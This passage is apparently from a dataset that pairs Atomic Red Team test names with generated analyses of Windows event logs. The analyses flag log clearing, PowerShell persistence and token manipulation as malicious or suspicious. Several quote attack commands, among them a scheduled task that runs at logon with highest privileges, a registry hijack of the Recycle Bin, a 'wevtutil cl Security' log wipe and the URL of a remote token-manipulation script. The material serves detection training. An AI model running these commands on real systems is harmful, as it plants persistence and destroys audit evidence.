### Guidance on How to Proceed:
- Conduct a thorough audit and review of the actions taken by the `admin_test` account, including logon times, and any associated network activity.
- Validate whether Atomic Red Team activities were sanctioned for testing purposes.
- Investigate any unusual time manipulation activity and cross-verify with network and other surveillance logs.
- Restrict privileges and monitor critical activities closely, consider enabling auditing where missing for unauthorized changes.
- If necessary, conduct a full security incident response to ensure the environment's integrity is restored.

### Resolution: **MALICIOUS**

The combination of log clearance, suspicious PowerShell activity involving known adversary simulation tools, and privilege abuse strongly suggest malicious activity, warranting immediate action and remedial measures."
Parent PID Spoofing - Spawn from svchost.exe,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious and potentially malicious activities have been identified. Here is a detailed assessment:

1. **PowerShell Logs:**
    - The PowerShell execution of a script that includes using `Get-CimInstance` to filter and interact with `svchost.exe` indicates advanced and potentially suspicious usage of PowerShell. The command `Start-ATHProcessUnderSpecificParent` with `Start-Sleep` is unusual and could be used to perform malicious actions while trying to mimic legitimate usage or delay commands for stealth.
    - The specific command line captures show an attempt to execute a new PowerShell process using a subshell that might be aiming for lateral movement or bypassing certain security controls.

2. **System Logs:**
    - There are multiple entries involving the clearing of event logs by `admin_test` (Event IDs: 104 in Eventlog and 1102 in Security). The deliberate clearing of logs is a common technique used by malicious actors to cover tracks and could indicate malicious intent.
    - While the Windows update logs show seemingly normal Windows Update activities, they do happen around the same time as suspicious activities, which could be used as a cover or distraction.

3. **Security Logs:**
    - Event IDs like 5379 (Credential Access: Logon failure) and 4624 (Logon - Successful) for SYSTEM are present. While a successful SYSTEM logon is common for services, it can also indicate attempted unauthorized access. There is no immediate link to determine it as malicious, but it warrants caution given the context of other activities.

4. **Sysmon Logs:**
    - Multiple uses of `wevtutil.exe` for clearing event logs is repeated and may confirm an attempt to delete evidence (Event ID: 5 and 1, multiple entries).
    - The presence and execution of `whoami`, `hostname`, and similar reconnaissance commands executed by `admin_test` might signal potential exploration or environment discovery activities typically seen in penetration testing or malicious reconnaissance phases.
    - The persistent use of legitimate Windows processes in potentially unconventional methods (e.g., using `wmi` to execute commands) raises more flags.

**Assessment and Resolution:**
Given the presence of suspicious PowerShell activity, event log clearing, and use of common reconnaissance tools, the activities in these logs are characterized as SUSPICIOUS. There are clear indicators that require more in-depth investigation to determine whether these activities were part of a planned and permissible penetration testing activity or if they represent a real security threat to the system.

**Guidance on How to Proceed:**
- Conduct a full forensic analysis of the affected host(s) to capture and preserve artifacts of possible attack vectors.
- Verify any scheduled or ongoing security testing activities for potential overlap.
- Review account `admin_test` to assess any potential unauthorized usage and confirm activity legitimacy.
- Increase logging verbosity and monitoring for this host to catch further or repeated suspicious activities.
- Consider engaging with a digital forensics expert or appropriate internal/external resources to provide deeper inspection and assurance against potential damage or compromises."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"## Detailed Analysis of the Windows Event Logs

### Key Observations:

1. **Suspicious Log Clearing Activity:**
   - **Event ID 1102 (Security Log), Event ID 104 (System Log), Log Entry in Sysmon Log):** Logs show that event logs for Application, System, and Security channels were cleared by the user `admin_test` using the process `wevtutil.exe`. Clearing of logs, especially security logs, is a common step taken by attackers to cover their tracks, making it suspicious.

2. **Time Change:**
   - **Event ID 4616 (Security Log):** The system time was set back from `2024-10-25 11:44:50.4576220` to `2024-10-25 11:44:45.0901204`. Time changes in conjunction with other anomalous activities can be an indicator of an attempt to evade detection.

3. **Privileged Logon:**
   - **Event ID 4672 (Security Log):** The user `admin_test` logged on with special privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. The granting of advanced privileges should be scrutinized, especially if this occurs outside of normal administrative tasks.

4. **Unusual PowerShell Execution:**
   - **Event ID 1 (Sysmon Log) & PowerShell Logs:** There was the execution of a PowerShell command that involves downloading and executing a script from a GitHub repository (https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1). The script attempts token manipulation, which can be associated with privilege escalation or persistence techniques.

5. **Normal Activity:**
   - Various other entries related to routine activities such as software updates (Microsoft Edge) conducted by the `NT AUTHORITY\SYSTEM` user.

### Assessment:

- **Log Clearing and Privilege Events:** The combination of log clearing and privileged actions strongly elevates the risk level since it is indicative of malicious behavior aimed at maintaining persistence while hiding activities.
  
- **Time Manipulation:** Altering system time can be used to mislead forensics analysis by disrupting the chronological order of logs. It can suggest attempts to conceal activities or manipulate log file entries.
  
- **Suspicious PowerShell Activity:** The execution of an external PowerShell script, particularly one that deals with token manipulation, indicates an effort to gain unauthorized access or higher privileges on the system. This is often seen in attack chains where attackers attempt to elevate privileges or perform lateral movements.

### Final Resolution:

- **MALICIOUS:** The events relating to log clearing, time manipulation, privilege escalation via suspicious PowerShell scripts, and the presence of special privilege logons, confirm malicious activity. Immediate incident response actions should be taken.

### Guidance on How to Proceed:

1. **Containment:**
   - Isolate the affected host (Server002) from the network to prevent further potential compromise or lateral movement in the environment.

2. **Investigation:**
   - Conduct a full forensic investigation on the isolated host to confirm the full scope and impact of the malicious activities.
   - Analyze network traffic from and to the host around the event timeframes to identify any external communications.
   - Review access logs and other host interactions within the same period for similar anomalies.

3. **Remediation:**
   - Reset passwords and check security permissions for `admin_test` and any other potentially affected accounts.
   - Patch the host system and update AV definitions across the network.
   - Review and tighten PowerShell execution policies and logging configurations.

4. **Communication:**
   - Report findings to relevant internal stakeholders and possibly external parties if sensitive data is at risk.
   - Prepare a communication plan to inform affected parties as necessary. 

5. **Preventive Measures:**
   - Implement stricter logging policies and real-time alert systems for log deletion or time changes.
   - Conduct user training and awareness on recognizing phishing and suspicious activities.
   - Regularly review and tighten privilege assignments and access controls."
Domain Password Policy Check: Common Password Use,"**Analysis of Windows Event Logs**

Upon examining the provided event logs, several key observations suggest potentially problematic or suspicious activity, particularly focused around log clearance and PowerShell execution. Here's a detailed breakdown:

1. **Log Clearance Activities:**
   - **System Logs (Event ID 104)** and **Security Logs (Event ID 1102)**:
     - These indicate that the log files (System and Windows PowerShell) have been cleared by the user ""admin_test"". Log file clearing is often a suspicious activity as it can be used to hide malicious actions. 
     - The Sysmon log also exhibits repeated activity where `wevtutil.exe` is used to clear multiple log channels (Security, System, Application, Windows PowerShell).

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` command is used multiple times across different logs to clear event logs. It’s being executed by the `admin_test` user with high integrity level, confirming elevated privileges.
   - This is consistent with attempts to remove traces of numerous activities performed on the system.

3. **PowerShell Script Execution:**
   - A PowerShell script is executed with a complex command sequence designed to change an account password (`Set-ADAccountPassword`), check against a stored credential, and update credentials if necessary. 
   - This script looks like it could potentially be part of a legitimate administrative script, but in the context of its execution timestamp aligning closely with the log clearance events, it raises suspicions. 

4. **Microsoft Edge Updates:**
   - Multiple processes associated with Microsoft Edge Update and installation are observed. While these can be legitimate and part of normal Edge update routines, the timing and correlation with `setup.exe` originating from a temporary path may need to be confirmed with the presence of legitimate patching or update tasks. These events occur shortly after the suspicious activity from `wevtutil.exe`.

5. **High System Integrity Operations:**
   - The `parentUser` and `User` fields consistently show elevated privilege users (admin_test, SYSTEM), which when paired with frequent clearing events, could represent actions aiming to obfuscate or cover malicious actions. 

**Resolution:**

Given the findings and analysis outlined, the activities present in the logs suggest deliberate actions to obscure or eliminate traces of potentially unauthorized or malicious operations on the system. The use of `wevtutil.exe` to clear logs, combined with the PowerShell script execution for password operations, such activities should not be frequent or typical on a secured and monitored system.

**Conclusion: SUSPICIOUS**

**Guidance on How to Proceed:**

- Conduct a more detailed forensic analysis to confirm the legitimacy of the PowerShell scripts and their originate context.
- Verify if Microsoft Edge updates align with a legitimate patch cycle or were unexpected.
- Investigate the user ""admin_test"" for unusual access patterns or privilege escalation.
- Strengthen system monitoring and limit log clearance capabilities to minimize trace-removal opportunities.
- Consider alerting the security operations team for potential incident response activities."
WMI Invoke-CimMethod Scheduled Task,"Upon reviewing the provided Windows event logs, there are several points of interest that may indicate suspicious behavior:

1. **Log Clearing Events:**
   - There are multiple log file clearing events captured. Specifically, Event ID 104 in the System log and Event ID 1102 in the Security log indicate that logs were cleared by the user ""admin_test"". This is often a red flag for potentially malicious behavior, as attackers may clear logs to cover their tracks.

2. **Command Utilization:**
   - The Sysmon logs indicate usage of `wevtutil.exe` to clear multiple logs including Sysmon operational, Application, System, and Security logs. The usage of `wevtutil` in this manner by ""admin_test"" to clear logs further supports the notion of an attempt to conceal activities.
   - In the PowerShell logs, there is evidence of a PowerShell command being executed that reads and registers an XML through `Invoke-CimMethod` for a scheduled task. This action, particularly when related to `AtomicRedTeam`, suggests a potential simulation or test of attack techniques, but it nonetheless is noteworthy when combined with log clearing activities.

3. **Adjustments to System Time:**
   - The security logs indicate a time change by the svchost.exe process. This could be normal activity but can also be used to obscure the actual timeline of events, especially when it coincides with other suspicious activities like log clearing.

4. **Elevated Permissions:**
   - Event ID 4672 shows that the account ""admin_test"" received elevated privileges, including potentially sensitive privileges such as SeDebugPrivilege and SeBackupPrivilege. Coupled with the context of other findings, this might indicate privilege escalation or misuse.

Overall, the combination of cleared event logs, usage of administrative tools to potentially tamper with logs (`wevtutil.exe`), execution of PowerShell scripts for task registration, and privilege escalation forms a pattern that is highly characteristic of malicious activity.

**Conclusion: MALICIOUS**

**Guidance on How to Proceed:**
- **Immediate Incident Response:** Alert your incident response team to initiate a deeper investigation into ""admin_test"" activities on the host and possibly other interconnected systems.
- **Review Access Logs:** Check access logs and other security appliances to determine the origin and potential lateral movement from the involved user account.
- **Forensics:** Acquire persistent storage data for in-depth forensic analysis to determine the extent of the compromise.
- **Account Analysis:** Review the activities and permissions associated with the user account ""admin_test"". Consider isolating or disabling the account temporarily to prevent further unauthorized actions.
- **Security Audit:** Conduct a full security audit of the system to assess potential vulnerabilities that could have been exploited during this incident."
Azure AD - adding user to Azure AD role,"Based on the provided logs, here is a detailed analysis of the activity observed:

### Suspicious/Anomalous Behavior
1. **Log Clearing Activity**:
   - The security log was cleared by a user named `admin_test`, as indicated by the event log with `EventID: 1102` from the Security log section. This action is often indicative of an attempt to cover tracks after unauthorized activity, especially since the security logs can contain critical evidence of malicious activity.
   - Similarly, application, system, and PowerShell logs were cleared using the `wevtutil.exe` tool. This is evident from the Sysmon logs, which show the use of `wevtutil.exe` with the command line argument to clear event logs (e.g., `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`) at the exact timestamps of log-clearing events.
   
2. **Suspicious PowerShell Commands**:
   - The logs indicate a PowerShell script was executed where an account `jonh@contoso.com` was used to connect to Azure AD using a hardcoded plaintext password. Using plaintext passwords within scripts is a bad security practice and could be a point of compromise if exposed.
   - This script then performs an administrative action by adding a user to the `Global Reader` role, which would typically require elevated privileges. If executed maliciously, this could indicate unauthorized privilege escalation.

3. **System Utilization Patterns**:
   - The execution of various system utilities such as `hostname.exe`, `whoami.exe` right after logging activities is suspicious and could be associated with attackers validating the environment or checking their current user context after gaining unauthorized access.

### Assessment and Conclusion
- The combination of logs being cleared, especially the security and PowerShell logs, and the apparent use of plaintext password in a PowerShell command to perform administrative tasks indicates a high possibility of malicious activity. Such activities are common in scenarios where an attacker is trying to escalate privileges or perform actions stealthily within an environment and cover their tracks.

### Resolution: MALICIOUS
Given the patterns of log clearing, use of plaintext credentials in scripts, and the nature of system activities observed, there's a strong indication of malicious activity. 

### Recommendations
1. **Immediate Mitigation**: 
   - Immediately isolate the affected host to prevent further unauthorized access or data exfiltration.
   - Change all credentials that might have been exposed, starting with the compromised user `jonh@contoso.com` and any other potentially impacted accounts.
   
2. **Thorough Investigation**:
   - Check for any other signs of unauthorized login attempts or other suspicious activities during the timeframe on this and related systems.
   - Perform a comprehensive forensic analysis to identify the full extent of the compromise, including potential data access or loss.
   
3. **Security Hardening**:
   - Disallow the use of plaintext passwords in scripts and enforce the use of secure credential storage and retrieval practices.
   - Implement stricter monitoring and alerting mechanisms for log-clearing events and unusual script executions.
   - Review and strengthen access controls, particularly for accounts with administrative roles."
SystemBC Malware-as-a-Service Registry,"Upon reviewing the provided Windows event logs, several indicators point toward suspicious and potentially malicious activity:

1. **Event Log Clearing**: 
   - Security Event ID 1102 and System Event ID 104 indicate the security and system logs were cleared by a user with the username ""admin_test."" Clearing of event logs is a common tactic used by adversaries to cover their tracks after system intrusion or malicious activity.

2. **Suspicious PowerShell Activity**:
   - Windows PowerShell logs show the use of a script involving PowerShell with hidden window style and an ExecutionPolicy Bypass to set a value in the Windows Run key (""socks5_powershell""). This is often indicative of persistence mechanisms used by malware.
   - Sysmon logs confirm execution of `powershell.exe` with suspicious command lines that match these actions, further implying unusual PowerShell use.

3. **Wevtutil Executions**:
   - Sysmon events detail multiple executions of `wevtutil.exe` to clear various logs (`Security`, `System`, `Windows PowerShell`). The command lines indicate intentional log clearing, which suggests an attempt to obscure evidence of potentially malicious actions.

4. **System Time Changes**:
   - The Security and System logs reflect events (Event ID 4616 and corresponding Kernel-General logs) showing changes in system time, which can disrupt log timelines and confuse investigators.

5. **No Parent Information for EdgeUpdate**:
   - Although there are numerous events pertaining to Microsoft Edge Updates, they generally align with regular update and installation processes, except for the setup being executed from a temporary directory. However, these actions appear to be running under the 'NT AUTHORITY\SYSTEM', consistent with legitimate processes, except the parent process is missing.

**Assessment and Guidance**:

- **Resolution**: MALICIOUS
  - The logs provide clear signs of potentially malicious activity, specifically due to event log clearing, hidden and bypassed PowerShell execution for persistence, and time adjustments, which are classic symptoms of post-compromise actions taken by an attacker to establish persistence and cover tracks.

- **Guidance**:
  1. **Immediate Incident Response**: Initiate incident response protocols to contain the affected host to prevent further spread or damage.
  2. **Forensic Analysis**: Perform a deeper forensic analysis on `Server002` to determine the full extent of the compromise, identifying potential indicators of compromise (IOCs) and malware presence.
  3. **Review Access Logs**: Examine network logs and access logs to trace any unauthorized access and identify the attack vector used.
  4. **Audit and Harden**: Review and tighten security controls on critical systems, particularly focusing on audit logging, PowerShell script executions, and user permissions.
  5. **Patch Management**: Ensure all systems are up-to-date with security patches and that software inventory is regularly audited."
Powershell Cmdlet Scheduled Task,"Upon reviewing the provided logs, there are several noteworthy observations that suggest potential malicious activity:

1. **Log Clearing Events:**
   - Events ID 1102 in Security logs indicate the Security event log was cleared.
   - Events ID 104 in System logs indicate the System and PowerShell event logs were cleared.
   - These actions were performed by the user `admin_test`. Log clearing can be an indicator of malicious activity as attackers commonly clear logs to eliminate traces of their actions.

2. **PowerShell Activity:**
   - There are numerous instances of PowerShell activity (Event ID 600 in Windows PowerShell logs) initiating a scheduled task that executes `calc.exe` with high privileges. The script was executing: 
     ```powershell
     $Action = New-ScheduledTaskAction -Execute ""calc.exe""
     $Trigger = New-ScheduledTaskTrigger -AtLogon
     $User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
     $Set = New-ScheduledTaskSettingsSet
     $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
     Register-ScheduledTask AtomicTask -InputObject $object
     ```
   - Usage of `-RunLevel Highest` is suspicious as it attempts to run the task with elevated privileges.

3. **Usage of `wevtutil.exe`:**
   - There are multiple entries in the Sysmon logs of executions of `wevtutil.exe` with the `cl` (clear) command, targeting different logs (Security, System, Application, and PowerShell). This is consistent with the noted log clearing and is a strong indicator of malicious activity, typically aiming to cover tracks.

4. **Process Execution Context:**
   - The Sysmon logs demonstrate several processes initiated under the `admin_test` account, which match the Security identity used to clear the logs, supporting the correlation of activities.
   - Elevated integrity levels and execution from a high-privileged context further suggest potentially unauthorized use or privilege escalation attempts.

5. **Normal Background Activity:**
   - The Sysmon logs capture normal system activities such as Microsoft Edge Updates, and WMI processes, which do not appear suspicious.

**Assessment and Resolution:**
The aggregate evidence in the logs—specifically the log clearing, the execution of PowerShell scripts attempting to escalate privileges, and repeated use of `wevtutil.exe` to clear different event logs—is indicative of an attempt to obfuscate activities consistent with a potential security breach.

The clear and orchestrated nature of these event log manipulations and script executions lead us to conclude that the logs contain:

- **MALICIOUS** activity.

**Guidance on How to Proceed:**
1. **Containment:**
   - Immediately isolate the host (Server002) from the network to prevent further potential malicious activity.
   
2. **Investigation:**
   - Conduct a comprehensive investigation on Server002 to determine the full scope of the breach, including identifying any additional compromised accounts or lateral movement in the network.

3. **Forensic Analysis:**
   - Perform a deeper forensic analysis of the host to recover deleted or cleared logs, and analyze any residual artifacts or memory captures.
   
4. **Review and Harden Security Posture:**
   - Review and potentially revoke privileges or re-evaluate the security posture concerning PowerShell execution policies and user permissions.
   - Implement stricter monitoring and alerting on log clearing activities and suspicious use of legitimate Windows utilities.

5. **Incident Reporting and Analysis:**
   - Report the incident per the organization's protocol to help refine and improve incident response strategies based on the findings from this event."
Suspicious bat file run from startup Folder,"After analyzing the provided logs, several indicators of suspicious activities have been identified. Here is a detailed assessment:

1. **Log Clearing**: The logs show that the security and system event logs were cleared (EventID 1102 in Security log and EventID 104 in System log) by the user `SERVER002\admin_test`. This is a suspicious activity as typically attackers clear logs to remove traces of their malicious actions.

2. **Process Execution**: The Sysmon logs reflect the execution of multiple utility programs (`wevtutil.exe`, `powershell.exe`, and `hostname.exe`) by the same user `SERVER002\admin_test`. Among these:
   - `wevtutil.exe` is used to query or clear event logs, and its usage in combination with log clearance is highly suspicious.
   - `powershell.exe` command executed is extremely suspicious. The command copies a batch file `batstartup.bat` to startup directories and then executes it. This indicates possible persistence mechanism as per MITRE ATT&CK T1547 (Boot or Logon Autostart Execution).

3. **Privilege Usage**: The user `SERVER002\admin_test` executed these processes with high integrity level, suggesting potential misuse of administrative privileges to carry out the actions.

4. **Time Manipulation**: Multiple events indicate a reset of the system clock (EventID 4616 in Security log and EventID 1 in System log). Alteration of system time can be a tactic to mislead log times, so this activity coinciding with other suspicious activities is alarming.

Based on this assessment, the activities in the logs suggest potential malicious intent. The utilization of built-in Windows utilities to clear logs and manipulate PowerShell scripts for persistence are consistent with known attack patterns.

**Resolution**: MALICIOUS

**Guidance**:
- **Isolate the affected system**: Immediately isolate the affected host from the network to prevent further potential spread of malicious activities.
- **Detailed Forensics**: Conduct in-depth forensic analysis including but not limited to checking for additional persistence mechanisms, unauthorized access attempts, and any network activity pointing to data exfiltration.
- **Review and Respond**: Check Active Directory for any anomalies concerning the user `admin_test`. Enforce password change policies and ensure multi-factor authentication.
- **Security Posture**: Strengthen security posture by enforcing stricter log management policies, monitoring for anomalous activities, and employing better endpoint detection and response tools.

The logs indicate a potential compromise, and urgent action is required to mitigate potential damages."
Add persistance via Recycle bin,"After carefully reviewing the provided log entries across various channels, I have identified suspicious activities that indicate potential malicious behavior. Here’s a detailed analysis:

### Analysis:

1. **Event Log Clearing:**
   - **Security Log**: The log entry with EventID 1102 suggests the Security log was cleared by the user `admin_test`. Log clearing is often performed to cover tracks after performing unauthorized or illicit actions. Additionally, the same user cleared the `System` and `Windows PowerShell` logs, as indicated by EventID 104 in the System log. This synchronized clearing of logs is anomalous and a strong indicator of potential malicious intent.

2. **Command Execution and Registry Modification:**
   - **Sysmon Log**: Among the events, there is an execution of `cmd.exe` (ProcessId 4016) with a command that adds a registry key to change the behavior of the Recycle Bin shortcut (`{645FF040-5081-101B-9F08-00AA002F954E}`) to launch `calc.exe` instead. This kind of modification is typically used as a persistence or privilege escalation technique by attackers. The command is: 
     ```
     reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f
     ```

3. **Process Execution Sequence:**
   - There are multiple executions of legitimate system utilities, including `hostname.exe` and `whoami.exe`, which might be used by an attacker to gather system information. However, on its own, this behavior could be benign unless correlated with other suspicious activities found.

4. **Usage of System Utilities for Log Clearing:**
   - Entries related to `wevtutil.exe` indicate usage with the `cl` (clear log) parameter targeting different event logs (e.g., Sysmon Operational, Application, System), executed under the high integrity level by the `admin_test` user. This reinforces the attempt to clear tracks.

5. **Edge Update Service Activity:**
   - The Microsoft Edge update service shows several executions, which by themselves might not be suspicious since they align with software update workflows. However, given the context of other suspicious activities, these should be reviewed to ensure they are legitimate and untampered.

### Conclusion:

The combination of log clearing, command execution modifying registry settings for persistence, and the synchronized nature of these actions underlines the likelihood of a malicious compromise. While some actions might have legitimate reasons, the convergence of these behaviors strongly suggests intentional malicious activity.

### Resolution:
- **MALICIOUS**: The logs clearly demonstrate activities consistent with malicious tactics, techniques, and procedures (TTPs). Immediate action should include investigating the user `admin_test`, monitoring for further unauthorized activities, and conducting a full forensic analysis of the affected systems.

### Next Steps:
- Isolate the affected system (Server002) from the network to prevent any further damage or spread.
- Conduct a thorough digital forensic investigation to recover any erased logs and uncover additional artifacts of the attack.
- Review access and permissions of user `admin_test` and look for any signs of compromised credentials.
- Validate the integrity of system files and review the system for additional suspicious modifications.
- Consider deploying enhanced logging and monitoring solutions to catch any similar future attempts."
Domain Password Policy Check: No Number in Password,"Upon reviewing the provided Windows event logs, the following activities stand out:

1. **Log Clearing (Event ID 104 and 1102):**
   - The logs show multiple log clearing activities performed by the user `admin_test` on various event channels (System, Security, Windows PowerShell).
   - Event ID 1102 in the Security log indicates that the Security event log was cleared.
   - Clearing event logs can be a sign of malicious activity, as it may indicate an attempt to cover tracks.

2. **Unusual PowerShell Activity:**
   - There are PowerShell activities that involve manipulating user credentials and resetting passwords using hardcoded credentials (`UpperLowerLong-special`). 
   - The PowerShell script seems to involve checking a stored credential file and altering the Active Directory account password, which could be indicative of malicious script use or a misconfigured automated task.

3. **Sysmon Logs (Event ID 1 and 5):**
   - The presence of multiple `wevtutil.exe` executions corresponding to the event clearing activities is noted. 
   - The use of `wevtutil.exe` to clear logs is particularly suspicious when paired with the timing and user context, matching that of the log-clearing events.
   - The processes initiated in quick succession suggest possible automation or scripted actions, potentially from a malicious actor.

4. **Prevalent Use of High Integrity Processes:**
   - Many processes, such as `wevtutil.exe`, are running with high integrity levels, which aligns with potentially unauthorized accesses or tasks executed with elevated privileges.

**Assessment and Recommendations:**

The analyzed activities are strongly indicative of malicious behavior:
- Log clearing operations are known tactics used by threat actors to hide actions conducted on a compromised system.
- The PowerShell activities with reference to script manipulation and credential checking raise red flags about possible credential theft or unauthorized account manipulation.

Given the combination of these observations, the conclusion is that the activity is:

- **MALICIOUS**

**Next Steps:**
- **Immediate Incident Response:** Begin a comprehensive incident response process to identify if there is broader compromise across systems. This includes preserving current logs for further analysis and preventing further log clearing.
- **Containment and Eradication:** Isolate the affected host and perform a deep forensic analysis to understand how the compromise occurred and ensure full remediation.
- **User and Access Review:** Reset credentials and review access rights for affected accounts, especially `admin_test`.
- **Security Measures Enhancement:** Increase monitoring of log clearing activities and automate alerting for unusual PowerShell executions to detect similar issues in real-time.
"
Parent PID Spoofing - Spawn from New Process,"After a comprehensive review and analysis of the provided Windows event logs, several observations can be made regarding potential suspicious activities:

1. **Event Log Clearing (Security Log and Sysmon Log Entries)**:
   - In the Security log, Event ID 1102 indicates that the security log was cleared by a user with the credentials `admin_test`. This log clearance took place on ""2024-10-25 12:13:06.6468859"".
   - Similarly, in the System log, Event ID 104 records that system logs were cleared by the same user slightly earlier on ""2024-10-25 12:13:06.5688354"".
   - The Sysmon log entries indicate multiple uses of `wevtutil.exe` to clear logs at similar timestamps.
   - Clearing event logs can be a legitimate operation; however, it is often associated with malicious activity, particularly when there is no clear organizational policy around such operations and the operator is not following standard procedures.

2. **Suspicious PowerShell Activity**:
   - In the Windows PowerShell log, PowerShell was used with complex command lines, including starting processes, such as `notepad.exe`, and presumably using `Start-ATHProcessUnderSpecificParent` to manipulate process execution or suppression. This is indicative of capabilities that might be used for hiding backdoor access or evade detection tools.
   - The appearance of `Start-Sleep 10` suggests an attempt at delaying operations, which might indicate scripting or attempts to bypass monitoring that looks for rapid process creations and terminations.

3. **Multiple Instances of `wevtutil.exe` Execution (Sysmon Log Entries)**:
   - Sysmon logs exhibit several instances of `wevtutil.exe` being executed with command lines targeting multiple log channels, e.g., ""System"", ""Security"", ""Application"", and ""Windows PowerShell,"" consistent with clearing operations.
   - Usage of `wevtutil.exe` to clear logs aligns with the narrative of attempting to hide traces or evidence of unauthorized activities.

4. **Overall Use of Administrative User `admin_test`**:
   - Activities, which include clearing logs and executing potentially harmful scripts, were performed by an account named `admin_test`. Using such accounts in line with suspicious activities and evasion techniques raises flags for potentially compromised credentials or insider threats abusing their access rights.

### Assessment:
**Resolution**: **MALICIOUS**

The observed activities present indicators of malicious behavior such as event log clearing, atypical PowerShell usage, and evidence-cleaning attempts. This suggests either a potential unauthorized access by a threat actor using the administrative account `admin_test` or misuse of legitimate administrative capabilities.

### Recommendations:
1. **Immediate Actions**:
   - Ensure the affected machine (Server002) is isolated from the network to prevent further malicious actions.
   - Conduct a thorough forensic investigation on the server, focusing on the integrity and usage of the `admin_test` account.
   - Review access logs and correlate any anomalies with the timestamps of log-clearing activities.
   
2. **Enhance Monitoring and Alerting**:
   - Set up stringent monitoring that alerts for privileged operations like log clearing or unconventional PowerShell executions.
   - Implement alerts for lateral movement or suspicious account usage, especially from high-integrity level processes.

3. **Credentials and Access Verification**:
   - Review and reset credentials for `admin_test` and other privileged accounts.
   - Assess roles and permissions for accounts with administrative access to ensure least privilege principles.
   
By following the specified actions, the organization can address the immediate threats and work towards reinforcing its defenses against similar future attacks."
Winlogon Notify Key Logon Persistence - PowerShell,"Upon reviewing the logs provided, the following suspicious activities were identified:

1. **PowerShell Script**: The PowerShell logs indicate the execution of a script that creates a new registry item under `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam` and sets several properties related to DLL loading and logon notifications. These modifications can be associated with persistence mechanisms used in adversary simulation frameworks like Atomic Red Team, which simulate adversary tactics, techniques, and procedures (TTPs) for testing and assessing security controls. The properties being set, such as `DllName` and `Logon`, resemble settings to trigger custom DLL execution, potentially for malicious purposes.

2. **Event Log Clearing**: The Security and System logs show entries where the logs have been cleared, particularly Event ID 1102 in the Security log, which indicates that the audit logs have been cleared by a user (`admin_test`). Log clearing is a common tactic attackers use to cover their tracks after performing unauthorized actions.

3. **Wevtutil Commands**: The Sysmon log captures `wevtutil.exe` being used multiple times to clear logs (`cl` command), including the Application, System, and Security event logs. This action is often linked to malicious activity aimed at hiding evidence of compromise and is executed by the same user, `admin_test`.

4. **Time Manipulation**: In the Security and System logs, there are entries showing alterations in system time using `svchost.exe`. Modifying system time can be a technique used to manipulate timestamps for logs and files for concealment purposes.

5. **Privilege Execution Context**: The execution of processes like `wevtutil.exe` and `powershell.exe` appears to occur within a high-integrity context, indicating that these operations have administrative privileges. Coupled with the log clearing activity, this is indicative of misuse of administrative rights.

**Assessment**:
- The combination of PowerShell script activity that modifies registry keys for potential persistent implanting, the clearing of event logs, and the high-privilege execution context strongly suggest malicious intent. The execution of potentially suspicious enhancements by an administrative user (`admin_test`) leads to possibilities of insider threat or credential misuse.

**Resolution**: **MALICIOUS**

**Guidance**:
1. **Immediate Action**: Isolate the affected host (Server002) from the network to prevent further spread or exfiltration of data.
2. **Forensic Investigation**: Conduct a thorough forensic investigation to determine the extent of the compromise, focusing on potential data exfiltration or lateral movement.
3. **Review User Activity**: Investigate the activities of the user `admin_test`, including a review of access logs, recent privileges granted, and any changes to security policy related to auditors or privileged users.
4. **Malware scan and Registry Audit**: Perform an in-depth antivirus/malware scan, and an audit of the registry, especially around the Notify keys, to ensure no malicious persistence mechanisms exist.
5. **Security Policy Review**: Ensure that logging policies are appropriately configured and that any clearing of logs is logged or notified to appropriate security personnel.
6. **Reinforce Monitoring and Alerting**: Enhance alerting mechanisms for suspicious command-line activity and potential abuses of log management tools.
"
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"Upon reviewing the provided event logs, I have identified several indicators of potential malicious activity:

1. **Log Clearing Evidence**: 
   - Multiple logs show events where log files for the ""System,"" ""Security,"" and ""Windows PowerShell"" channels were cleared by the user `admin_test`. This action is generally unusual and suspicious as it could be an indicator of a user attempting to hide their tracks after performing malicious actions. Specifically, the commands executed via `wevtutil.exe` to clear the event logs stand out.

2. **Suspicious PowerShell Execution**:
   - A PowerShell script is being executed with elevated privileges (`High` IntegrityLevel) by user `admin_test`. This script includes operations that modify Azure AD user credentials and add roles to a user (`Company Administrator` and `Global Reader`). This script can indicate malicious intent, as it attempts to change user credentials and escalate privileges, which is highly anomalous and unauthorized if not part of routine administrative tasks.

3. **Process Execution Anomalies**:
   - `CompatTelRunner.exe`, a telemetry service executable, shows up in a context of accessing different user accounts, which is typically unusual behavior for this executable if not thoroughly documented or expected in this environment.

4. **Overall Activity Pattern**:
   - The combination of clearing logs, executing suspicious PowerShell scripts, and the telemetry service `CompatTelRunner.exe` accessing varied user domain accounts could suggest attempts to gain persistence or explore internal network infrastructure, often associated with lateral movement in a compromised network.

Based on these observations, the logs strongly indicate suspicious and potentially malicious behavior. The clearing of log files and execution of sensitive PowerShell commands aimed at manipulating credentials and roles without a legitimate reason are significant red flags.

### Resolution: MALICIOUS
Given these findings, I recommend the following steps:
- Immediately conduct an audit of the user account `admin_test` for unauthorized actions and access.
- Monitor for any further unauthorized use or execution of PowerShell scripts.
- Review internal policy on the use of PowerShell and consider implementing more restrictive logging and monitoring settings.
- Restore any potentially affected configurations, especially with respect to user accounts and roles in Azure.
- Consider isolating the impacted system (Server002) for detailed forensic analysis and to prevent further propagation if it is indeed compromised.

Ensure all potentially affected users and stakeholders are informed and that the investigation continues in cooperation with IT security teams to mitigate further risk."
Modify Service to Run Arbitrary Binary (Powershell),"After a thorough analysis of the provided Windows event logs, several indicators of potentially malicious activity were identified:

### Suspicious Behaviors:

1. **PowerShell Script Activity:**
   - Multiple entries in the PowerShell logs show the execution of a script that manipulates the ""fax"" service by changing its binary path to ""notepad.exe"". This pattern is typical of a technique used for persistence or privilege escalation, in which a legitimate service's configuration is altered to launch a non-standard executable.

2. **Log Clearing Events:**
